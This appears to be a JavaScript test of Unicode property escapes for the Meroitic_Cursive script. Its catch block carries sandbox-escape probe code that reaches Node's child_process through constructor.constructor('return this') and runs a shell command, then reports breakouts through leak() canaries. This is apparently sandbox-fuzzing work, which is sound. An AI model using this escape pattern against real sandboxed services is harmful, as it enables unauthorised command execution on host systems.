try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                68000,
                68023
            ],
            [
                68028,
                68047
            ],
            [
                68050,
                68095
            ]
        ]
    });
    testPropertyEscapes(/^\p{Script_Extensions=Meroitic_Cursive}+$/u, matchSymbols, '\\p{Script_Extensions=Meroitic_Cursive}');
    testPropertyEscapes(/^\p{Script_Extensions=Merc}+$/u, matchSymbols, '\\p{Script_Extensions=Merc}');
    testPropertyEscapes(/^\p{scx=Meroitic_Cursive}+$/u, matchSymbols, '\\p{scx=Meroitic_Cursive}');
    testPropertyEscapes(/^\p{scx=Merc}+$/u, matchSymbols, '\\p{scx=Merc}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                56319
            ],
            [
                57344,
                67999
            ],
            [
                68024,
                68027
            ],
            [
                68048,
                68049
            ],
            [
                68096,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script_Extensions=Meroitic_Cursive}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Meroitic_Cursive}');
    testPropertyEscapes(/^\P{Script_Extensions=Merc}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Merc}');
    testPropertyEscapes(/^\P{scx=Meroitic_Cursive}+$/u, nonMatchSymbols, '\\P{scx=Meroitic_Cursive}');
    testPropertyEscapes(/^\P{scx=Merc}+$/u, nonMatchSymbols, '\\P{scx=Merc}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}